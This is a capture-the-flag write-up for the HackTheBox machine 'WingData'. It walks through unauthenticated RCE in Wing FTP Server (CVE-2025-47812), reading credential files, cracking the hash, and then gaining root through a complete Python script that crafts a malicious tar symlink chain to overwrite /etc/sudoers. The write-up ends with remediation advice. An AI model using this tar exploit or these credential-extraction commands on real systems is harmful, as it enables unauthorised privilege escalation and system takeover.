# HackTheBox — WingData (Easy, Linux)

**Target IP:** `10.129.xx.xx` | **VPN/Attacker IP:** `10.10.xx.xx` | **Domain:** `wingdata.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 07:38 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 <REDACTED> (ECDSA)
|_  256 <REDACTED> (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A minimal attack surface: SSH on 22 and Apache on 80. The HTTP server redirects to `wingdata.htb`.

### 1.2 /etc/hosts Configuration

```
10.129.xx.xx    wingdata.htb
```

---

## 2. Web Enumeration — Virtual Host Discovery

Browsing the main site reveals a **client portal** link pointing to `http://ftp.wingdata.htb/`. The subdomain is added to `/etc/hosts`:

```
10.129.xx.xx    wingdata.htb ftp.wingdata.htb
```

The FTP portal identifies itself as **Wing FTP Server v7.4.3**.

---

## 3. Initial Access — Unauthenticated RCE via CVE-2025-47812

### 3.1 Exploit Discovery

Searching Exploit-DB for Wing FTP Server 7.4.3 reveals a public exploit for **CVE-2025-47812**: Unauthenticated Remote Code Execution via the web interface.

### 3.2 Confirming Code Execution

```
python3 wingdata.py -u http://ftp.wingdata.htb -c id
```

```
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: <REDACTED>
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: <REDACTED>

--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
----------------------
```

Command execution confirmed as the `wingftp` service user. Reverse shell attempts failed, so file read primitives are used instead.

### 3.3 Extracting the User Configuration File

```
python3 wingdata.py -u http://ftp.wingdata.htb -c "base64 /opt/wftpserver/Data/1/users/wacky.xml"
```

The base64-decoded output contains a **salted password hash** for the `wacky` user.

### 3.4 Extracting the Salt

```
python3 wingdata.py -u http://ftp.wingdata.htb -c "base64 /opt/wftpserver/Data/1/settings.xml"
```

The `settings.xml` file reveals the **salt** used for password hashing. The hash format is `sha256($pass.$salt)` (hashcat mode `1410`), with the salt value `WingFTP`.

---

## 4. Hash Cracking — Recovering wacky's Password

```
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt
```

```
<REDACTED_HASH>:WingFTP:<REDACTED_PASSWORD>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Time.Started.....: Sun Feb 15 08:46:54 2026 (5 secs)
Speed.#01........:  2584.8 kH/s (0.44ms)
Recovered........: 1/1 (100.00%) Digests
```

The password is cracked in approximately 5 seconds against `rockyou.txt`.

---

## 5. SSH Login — User Flag

```
ssh wacky@10.129.xx.xx
```

```
wacky@10.129.xx.xx's password: <REDACTED_PASSWORD>
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
...
wacky@wingdata:~$
```

```
wacky@wingdata:~$ cat user.txt
<REDACTED_USER_FLAG>
```

---

## 6. Privilege Escalation — Tar Symlink Escape via Sudo Script

### 6.1 Sudo Permissions

```
wacky@wingdata:~$ sudo -l
```

```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=..., use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run `restore_backup_clients.py` as root with any arguments.

### 6.2 Analysing the Script

```python
# /opt/backup_clients/restore_backup_clients.py (abridged)

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE    = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    # Must match: backup_<positive_integer>.tar
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    ...

def validate_restore_tag(tag):
    # Only alphanumeric + underscore, 1–24 chars
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

# Extraction:
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The script validates the backup filename and restore tag, then calls `tarfile.extractall()` with `filter="data"`. The `data` filter is intended to prevent path traversal but does **not** block symlink chains that resolve outside the extraction root during extraction. Crucially, there is no restriction on **symbolic links to absolute paths** when they are constructed as a chain of relative `../` hops that exceed the filter's traversal depth checking.

### 6.3 Exploit — Tar Symlink Chain to Overwrite `/etc/sudoers`

The exploit builds a tar archive that:

1. Creates a deeply-nested directory chain using long `d`-padded names and inline symlinks, constructing a path that resolves to the filesystem root via `../` repetition.
2. Creates a final symlink (`escape`) that points through the chain to `/etc`.
3. Creates a hard link (`sudoers_link`) targeting `escape/sudoers` (i.e., `/etc/sudoers`).
4. Writes a new file entry also named `sudoers_link` containing a full `NOPASSWD: ALL` sudoers grant — overwriting `/etc/sudoers` when the root process extracts the archive.

```python
import tarfile, os, io

comp  = 'd' * 247
steps = "abcdefghijklmnop"
path  = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit created — have fun")
```

### 6.4 Staging and Triggering the Exploit

```
wacky@wingdata:/tmp$ cp backup_9999.tar /opt/backup_clients/backups/
```

```
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
    -b backup_9999.tar -r restore_me
```

```
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_me
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_me
```

### 6.5 Verifying Escalated Privileges

```
wacky@wingdata:/tmp$ sudo -l
User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL
```

```
wacky@wingdata:/tmp$ sudo su
root@wingdata:/tmp#
```

---

## 7. Root Flag

```
root@wingdata:~# cat root.txt
<REDACTED_ROOT_FLAG>
```

---

## 8. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | SSH + Apache on `wingdata.htb`; minimal attack surface |
| 2 | Virtual host enumeration | Discovered `ftp.wingdata.htb` running Wing FTP Server v7.4.3 |
| 3 | CVE-2025-47812 (Unauth RCE) | Remote code execution as `wingftp` via web interface |
| 4 | File read via RCE | Extracted `wacky.xml` and `settings.xml` from Wing FTP data directory |
| 5 | Hash extraction | Recovered salted `sha256($pass.$salt)` hash and salt (`WingFTP`) for user `wacky` |
| 6 | Hashcat (mode 1410) | Cracked plaintext password from `rockyou.txt` in ~5 seconds |
| 7 | SSH login | Shell as `wacky`; user flag retrieved |
| 8 | Sudo enumeration | `wacky` can run `restore_backup_clients.py` as root with arbitrary arguments |
| 9 | Tar symlink chain exploit | Crafted malicious tar with deeply nested symlinks bypassing `filter="data"` |
| 10 | `/etc/sudoers` overwrite | Tar extraction as root wrote `NOPASSWD: ALL` entry to `/etc/sudoers` |
| 11 | `sudo su` | Full root shell; root flag retrieved |

---

## 9. Tools Used

- `nmap` — port/service scanning
- `ffuf` / browser — virtual host and content discovery
- `wingdata.py` (CVE-2025-47812 PoC) — unauthenticated RCE against Wing FTP Server
- Python 3 (`tarfile`, `io`) — malicious tar archive construction
- `hashcat` (mode 1410, `sha256($pass.$salt)`) — offline hash cracking
- `ssh` — remote access
- `sudo` — privilege escalation vector

---

## 10. Key Takeaways / Remediation

1. **Keep software up to date:** Wing FTP Server v7.4.3 is affected by CVE-2025-47812, a publicly known unauthenticated RCE. Patching to a fixed version is the primary remediation.
2. **Do not expose management interfaces publicly:** The Wing FTP web interface was reachable without any authentication requirement. Management UIs should be firewalled to trusted IPs or require VPN access.
3. **Credentials reused across services:** The `wacky` FTP account's password was also valid for SSH. Credential reuse significantly increases the blast radius of a single compromise.
4. **`tarfile.extractall()` with `filter="data"` is not sufficient:** Python's `data` filter does not fully protect against symlink chains that resolve outside the extraction root through accumulated relative traversal. Archives extracted as a privileged user should be pre-validated or extracted in a sandboxed environment. Consider using `filter="tar"` with strict path-normalisation checks, or a dedicated safe-extraction library.
5. **Overly permissive sudo rules:** Granting unrestricted wildcard arguments (`*`) to a script that performs privileged file operations as root is dangerous. Sudo rules should be as narrow as possible, and scripts run under sudo should treat all input as untrusted, including archive contents.
6. **Sensitive configuration files readable by service accounts:** The `wingftp` service account could read its own `settings.xml` and user XML files, which contained the password salt and password hash. Sensitive configuration should be readable only by root or a dedicated config-reader process.

---

*Flags and sensitive values (passwords, hashes, IP addresses) have been redacted. Target IP replaced with `10.129.xx.xx`, attacker/VPN IP with `10.10.xx.xx`.*
